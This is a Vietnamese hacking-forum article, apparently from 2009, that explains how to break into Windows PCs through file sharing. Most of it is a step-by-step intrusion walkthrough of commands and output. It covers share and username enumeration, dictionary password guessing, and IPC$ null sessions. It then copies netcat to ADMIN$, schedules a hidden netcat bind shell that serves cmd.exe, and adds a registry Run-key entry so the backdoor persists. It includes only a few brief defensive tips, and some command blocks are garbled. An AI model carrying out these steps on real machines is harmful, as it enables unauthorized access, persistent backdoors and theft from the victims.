<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta name="description" content="HVA Reading Room">
<meta name="keywords" content=", reading room, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title> - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0" align="center">
	<tr>
        <td width="100%" align="center" valign="middle">
			<a href="http://www.hvaonline.net" title="[Logo]"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" /></a>
		</td>
	</tr>

	<tr>
		<td>
<table cellspacing="0" cellpadding="0" width="80%" align="center" border="0">

		<tr height="15">
			<th colspan="2" class="thportal" align="left"><span class="readingheader">&nbsp;.::Exploit::.</span></th>
		    <th class="thportal" align="center">
				<span class="readingheader">
					 Hacking PC resource share - Hướng đi và giải pháp <a name="topPage" id="topPage"></a>
				</span>
			</th>
		    <th class="thportal" align="right">
				<a href="/hvaonline/posts/list/0/1106.html#4650" target="_blank">
				<img src="/hvaonline/templates/viet/images/goright.gif" align="absbottom" border="0" alt="Go to original post" title="Go to original post"/></a> 
				<img src="/hvaonline/templates/viet/images/what.gif" align="absbottom" border="0" alt="Author: zeno - Translator:  - Entry Date: 19/02/2009 13:40:27" title="Author: zeno - Translator:  - Entry Date: 19/02/2009 13:40:27"/>
			</th>
		</tr>
</table>

<table cellspacing="0" cellpadding="5" width="80%" align="center" border="0">
		<tr>
		    <td align="left" colspan="2" class="readingborderBottom">
				<table cellspacing="0" cellpadding="10" width="95%" align="center" border="0">
					<tr>
						<td align="left">
							<div class="postbody"><br/> <i>Tác giả: ZENO-HVAOnline</i><br/> <br/> <font color='olive'><i>Bài viết này với mục đích chia sẻ,học hỏi,trao đổi kiến thức! Nội dung của bài viết là hack vào PC sử dụng HĐH windows và các phương pháp phòng chống (trong phạm vi kiến thức của tui thôi nha).</i></font> <br/> <br/> Bây giờ chúng ta cùng bắt đầu suy nghĩ những hướng phải đi. Khi bạn Online ( tức kết nối vào Internet) bạn sẽ được ISP gán cho một IP nào đó. Vậy Hacker có biết được IP của bạn không? Câu trả lời là có ( nếu Hacker giao tiếp với bạn,có nghĩa là máy của bạn và máy của hacker có sự kết nối, đồng nghĩa với việc trao đổi các packet,từ các packet có thể biết được địa chi IP nguồn)<br/> <br/> Khi biết IP của bạn liệu hacker có thể hack vào máy tính của bạn không? Câu trả lời là hoàn toàn có thể.<br/> Vậy hacker làm như thế nào để Hack?<br/> <br/> <i><b>Hacking thông qua resource share:</b></i><br/> <br/> Hacker có thể dùng các tool hack tự động ví dụ như : ent3,legion… ( nhưng bản chất của các công cụ này là thưc hiện các bước mà tôi sẽ nói dưới đây 1 cách tự động,chính vì vậy việc dùng các tool này là một cách khá củ chuối …)<br/> Trước tiên Hacker sẽ kiểm tra nhưng tài nguyên được chia sẻ trên máy tính của bạn. <br/> Chỉ bằng vài dòng lệnh đơn giản trên comand line:<br/> <br/> <blockquote><br/> <br/> CODE<br/> <br/> [C:\&gt;Net view \\x.x.x.x  ( với x.x.x.x là địa chỉ IP của bạn mà hacker đã biết )<br/> <br/> Shared resources at \\x.x.x.x<br/> <br/> Share name  Type  Used as  Comment<br/> -------------------------------------------------------------------------------<br/> C             Disk<br/> PRJA3       Disk<br/> The command completed successfully.<br/> C:\&gt;&nbsp;<br/> 		</blockquote><br/> <br/> <br/> Với Windows 95 & 98 thì khả năng bị hack Cao hơn nhiều so với Windows NT,2000,XP ( vì win 95,98 dùng định dạng FAT&FAT32 có độ bảo mật thấp hơn nhiều so với NTFS)<br/> <br/> Đối với hai loại Windows này (95,98) Hacker thậm chí không cần lấy Administrator cũng có thể làm được tất cả ( bạn có tin không ?). <br/> Khuyến cáo : không nên dùng 2 loại win này vì quá lỗi thời và có thể bị hack bất cứ lúc nào.<br/> <br/> Sau khi liệt kê các Ổ đĩa,folder share bước tiếp theo của hacker là phải truy cập vào các ổ đĩa,folder đó để lấy dữ liệu (đây cũng là mục đích của hacker).Hacker sẽ ánh sạ ổ đĩa ,thư mục share để truy cập vào.<br/> Cũng bằng command line:<br/> <br/> <br/> CODE<br/> <br/> <br/> <blockquote>C:\&gt; net use z: \\x.x.x.x \share<br/> The command completed successfully&nbsp;<br/> 		</blockquote>.<br/> <br/> <br/> <br/> Chẳng lẽ hack đơn gian vậy sao ? Không , không hề đơn giản như thế bởi vì máy của victim có đặt password ( viêc ánh sạ cần phải biết username & password ).Thế là Hacker pó tay ? không hacker không bao giờ chịu pó tay,hacker sẽ cố gắng lấy username & password<br/> Lấy Username :<br/> <br/> <br/> CODE<br/> <br/> <br/> C<blockquote>:\&gt; Nbtstat –A x.x.x.x<br/> <br/>        NetBIOS Remote Machine Name Table<br/> <br/>    Name               Type         Status<br/> ---------------------------------------------<br/> ADMIN            &lt;00&gt;  UNIQUE          Registered<br/> BODY              &lt;00&gt;  GROUP           Registered<br/> ADMIN    f        &lt;20&gt;  UNIQUE           Registered<br/> BODY              &lt;1E&gt;  GROUP            Registered<br/> BODY              &lt;1D&gt;  UNIQUE           Registered<br/> ..__MSBROWSE__.&lt;01&gt;  GROUP       Registered<br/> <br/> MAC Address = 00-08-A1-5B-E3-8C&nbsp;<br/> 		</blockquote><br/> <br/> <br/> Vậy máy x.x.x.x sẽ có 2 username là : ADMIN va BODY<br/> Khi đã có username hacker sẽ tiến hành Crack password ( dựa vào các tool như : pqwak,xIntruder) Hoặc Hacker sẽ tiến hành tạo ra một từ điển ( dựa vào khả năng phán đoán của hacker ) tên là : pass.txt<br/> <br/> <br/> CODE<br/> <br/> <br/> <blockquote>“” ADMIN<br/> 123456 ADMIN<br/> 123456 BODY<br/> “” BODY<br/> …&nbsp;<br/> 		</blockquote><br/> <br/> Sau đó hacker crack bang lệnh :<br/> [/CODE]<br/> Cũng có thể tạo Userlist.txt và passlist.txt rồi dùng lệnh:<br/> <br/> <br/> CODE<br/> <br/> <blockquote><br/> C:\&gt; FOR /F %i IN (1,1,254) DO nat –u userlist.txt –p passlist.txt x.x.x.x.%I&gt;&gt;output.txt &nbsp;<br/> 		</blockquote><br/> <br/> Đối với Win 2000,XP hacker sẽ không là gì nếu không phải administrator chính vì vậy hacker bằng mọi giá sẽ lấy cho được administrator.<br/> nếu lấy được admin thì việc còn lại thì chờ hacker định đoạt.<br/> Khuyến cáo : không nên share gì hết ( trong trường hợp buộc phải share thì nên đặt password phức tạp 1 chút )<br/> Giả sử rằng máy của Victim không share. Vậy hacker làm sao ?<br/> <br/> Trong trường hợp này hacker sẽ đoán user & pass (có thể dùng cách ở trên hoặc dung các tool như: user2sid/sid2user,dumpACL,SMBGrind……) sau đó kết nối tới IPC$ ( mặc định share của windows)<br/> <br/> <br/> CODE<br/> <br/> <br/> <blockquote>C:\&gt; net use \\x.x.x.x\IPC$ “password” /user:”administrator”<br/> The command completed successfully.&nbsp;<br/> 		</blockquote><br/> Trong trường hợp không thê đoán Đươc user & pass hacker có thể thiết lập một Null session tới máy victim:<br/> <br/> <br/> CODE<br/> <br/> <blockquote>C:\&gt; net use \\x.x.x.x\IPC$ “” /user:””<br/> The command completed successfully  &nbsp;<br/> 		</blockquote><br/> Và rồi nếu victim permission không đúng sẽ có nhưng hậu quả khôn lường.<br/> <br/> khuyến cáo : Vô hiệu hoá NetBios ( Bấm vào My Network Places chọn Local Area Connetion, chọn TCP/ IP sau đó bấm vào propperties chọn Advandce, chọn WINS và bấm vào Disable NetBIOS over TCP / IP), Dùng firewall chặn 1 số port không cần thiết , khoá tài khoản sau 1 số lần đăng nhập thất bại .<br/> <br/> Tiện đây cũng nói thêm về điều khiển từ xa ( vì có nhiều bạn đột nhập được vào rùi mà không biết phải làm sao ) <br/> <br/> Giả sử rằng bạn đã có username,password của admin của máy victim rồi:<br/> giờ thiết lập 1 phiên làm viêc:<br/> <br/> <br/> <br/> CODE<br/> <br/> <blockquote>C:\&gt; net use \\x.x.x.x\IPC$ “password” /user:”administrator”<br/> The command completed successfully.&nbsp;<br/> 		</blockquote><br/> <br/> <br/> Sau đó ta cần copy backdoor để điều khiển máy victim có rất nhiều loại backdoor nhưng tôi thấy hơn cả vẫn là : netcat ( nc)<br/> chép nc vào máy victim<br/> <br/> <br/> <br/> CODE<br/> <br/> C<blockquote>:\&gt;copy nc.exe \\x.x.x.x\ADMIN$\nc.exe<br/> The command completed successfully.<br/>               1 file copies&nbsp;<br/> 		</blockquote><br/> Chạy service Schedule trên máy victim ( có service này mới thực thi đ ươc các file trên máy victim, mặc đinh khi cài win sẽ chạy service này) <br/> <br/> <br/> <br/> <blockquote>CODE<br/> <br/> C:\&gt; sc \\x.x.x.x  start  schedule<br/>        service_name : schedule&nbsp;<br/> 		</blockquote><br/> <br/> Bây giờ kiểm tra giờ trên máy victim<br/> <br/> <br/> <br/> CODE<br/> <br/> <blockquote>C:\&gt; net time \\x.x.x.x<br/> <br/> Current time at \\10.0.0.31 is 6/29/2005 4:50 AM<br/> <br/> The command completed successfully.&nbsp;<br/> 		</blockquote><br/> <br/> <br/> Bây giờ chạy netcat ở chế độ ẩn lắng nghe cổng 111:<br/> <br/> <br/> <br/> CODE<br/> <br/> <blockquote>C:\&gt;AT  \\x.x.x.x  4:55 /interactive “c:\windows\nc.exe” –L –d –p111 –e cmd.exe<br/> <br/> Added a new job with job ID = 1&nbsp;<br/> 		</blockquote><br/> đợi đến 4:55 rồi chạy thử nc.exe<br/> <br/> <br/> <br/> CODE<br/> <br/> <blockquote>C:\&gt;nc –nvv x.x.x.x 111<br/> <br/> (UNKNOWN) [x.x.x.x] 111 (?) open<br/> Microsoft Windows XP [Version 5.1.2600]<br/> © Copyright 1985-2001 Microsoft Corp.<br/> <br/> C:\windows&gt;&nbsp;<br/> 		</blockquote><br/> <br/> Bây giờ làm gì thì tuỳ nha ( nhưng đừng có phá hoại người ta nhe’)<br/> Vấn đề là làm sao cho những lần sau victim bật máy tính lên netcat tự động chạy và lắng nghe mệnh lệnh của ta?<br/> Bạn có thể cho netcat khởi động cùng windows. "moi" file netcat.reg (dùng notepad và save lại thành .reg) có nội dung như sau:<br/> <br/> <br/> <br/> CODE<br/> <br/> <blockquote>Windows Registry Editor Version 5.00<br/> <br/> [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]<br/> "netcat"="\"C:\\nc\\nc.exe\" -L -d -p111 -e cmd.exe"&nbsp;<br/> 		</blockquote><br/> <br/> Sau đó copy sang máy victim và chạy nha! <br/> Hy vọng mọi người đừng phá hoại nha ! Thân<br/> <br/> <i>Tác giả: ZENO-HVAOnline</i><br/> <br/> </div>
						</td>
					</tr>

					<tr>
						<td align="left"><a href="http://digg.com/submit?phrase=2&url=http://www.hvaonline.net/hvaonline/readingRoom/item/4650.html"><img src="/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
<a href="http://del.icio.us/post?url=http://www.hvaonline.net/hvaonline/readingRoom/item/4650.html"><img src="/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=http://www.hvaonline.net/hvaonline/readingRoom/item/4650.html"><img src="/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=http://www.hvaonline.net/hvaonline/readingRoom/item/4650.html"><img src="/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
<a href="http://technorati.com/faves?add=http://www.hvaonline.net/hvaonline/readingRoom/item/4650.html"><img src="/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
<a href="http://reddit.com/submit?url=http://www.hvaonline.net/hvaonline/readingRoom/item/4650.html"><img src="/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
<a href="http://www.stumbleupon.com/submit?url=http://www.hvaonline.net/hvaonline/readingRoom/item/4650.html"><img src="/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
					</tr>
				</table>
			</td>
		</tr>



		<tr>
			<td align="left" valign="top">
				<a href="#topPage"><img src="/hvaonline/templates/viet/images/goup.gif" align="absbottom" border="0" alt="Go to top" title="Go to top"></a>
				<a href="/hvaonline/posts/list/0/1106.html#4650" target="_blank"><img src="/hvaonline/templates/viet/images/goright.gif" border="0" align="absbottom" alt="Go to original post" title="Go to original post"></a> 
				&nbsp;
			</td>
			<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap">
				<form action="" name="f" id="f" accept-charset="UTF-8">
					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/readingRoom/show/'+ this.options[this.selectedIndex].value +'.html'; }" name="select">
						<option value="0" selected="selected">Go to Category</option>	
						<option value="0">------------------------</option>	
								<option value="1">Defense</option>
								<option value="2">Exploit</option>
								<option value="3">Reverse Engineering</option>
								<option value="4">*nix</option>
								<option value="5">Windows</option>
								<option value="6">Networking</option>
								<option value="7">Others</option>
					</select>
				</form>
			</td>
		</tr>
	</table>
</td>
		</tr>
</table>
<script type="text/javascript">
		var ctlTop = false;
		var ctlBt = false;

		function activateControllerTop()
		{
			ctlTop = !ctlTop;
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");

			if (ctlTop) {
				document.location = document.location + "#ctlTop";
			}
		}

		function activateControllerBottom()
		{
			ctlBt = !ctlBt;
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");

			if (ctlBt) {
				document.location = document.location + "#ctlBt";
			}
		}
</script>

	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
